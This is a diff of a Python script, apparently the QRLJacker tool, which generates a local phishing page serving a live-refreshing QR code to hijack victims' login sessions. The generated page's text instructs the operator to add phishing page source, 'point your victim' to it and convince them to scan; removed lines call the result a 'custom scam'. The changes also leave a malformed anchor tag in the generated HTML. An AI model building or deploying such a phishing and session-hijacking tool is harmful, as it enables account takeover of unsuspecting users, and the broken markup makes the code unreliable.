@@ -39,8 +39,6 @@ def Serve_it(port=1337):
 		else:
 			print " [!] Serving files on "+str(port)+" port"
 			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")
-		print " [N] Note : Now we created simple html file for you.."
-		print " [N]..if you want to create a custom scam,you will find the qr picture at the same folder [ Good Luck :D ]"
 	threading.Thread(target=serve,args=(port,)).start()
 
 def create_driver():
@@ -386,13 +384,13 @@ document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
 </script><center>
 <h1><b>Scan Me Please</b></h1>
 Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
-0. This is your *always updated {0} QR Code*
+0. This is your *always updated """+str(service_name)+""" QR Code*
 <img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;">
 1. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)
-2. Point your victim to <a href="http://Your_IP:{1}" /a>, Convince to scan the QR code and Bob is your uncle!
+2. Point your victim to <a href='http://Your_IP:'"""+str(port)+""" /a>, Convince to scan the QR code and Bob is your uncle!
 </center>
 </body>
-</html>""".format( service_name , port )
+</html>"""
 
 	if typ == "svg":
 		code = """<html>
@@ -409,13 +407,13 @@ document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
 </script><center>
 <h1><b>Scan Me Please</b></h1>
 Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
-0. This is your *always updated {0} QR Code*
+0. This is your *always updated """+str(service_name)+""" QR Code*
 <img id="qrcodew" alt="Scan me!" src="tmp.svg" style="display: block;">
 1. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)
-2. Point your victim to <a href="http://Your_IP:{1}" /a>, Convince to scan the QR code and Bob is your uncle!
+2. Point your victim to <a href='http://Your_IP:'"""+str(port)+""" /a>, Convince to scan the QR code and Bob is your uncle!
 </center>
 </body>
-</html>""".format( service_name , port )
+</html>"""
 	f = open("index.html","w")
 	f.write(code)
 	f.close()
@@ -661,9 +659,9 @@ def Third_Method(url,image_number,s=10):
 def main():
 	clear()
 	print """
-  ___  ____  _         _            _
- / _ \|  _ \| |       | | __ _  ___| | _____ _ __
-| | | | |_) | |    _  | |/ _` |/ __| |/ / _ | '__|
+  ___  ____  _		 _			_
+ / _ \|  _ \| |	   | | __ _  ___| | _____ _ __
+| | | | |_) | |	_  | |/ _` |/ __| |/ / _ | '__|
 | |_| |  _ <| |___| |_| | (_| | (__|   |  __| |
  \__\_|_| \_|_____|\___/ \__,_|\___|_|\_\___|_|
 
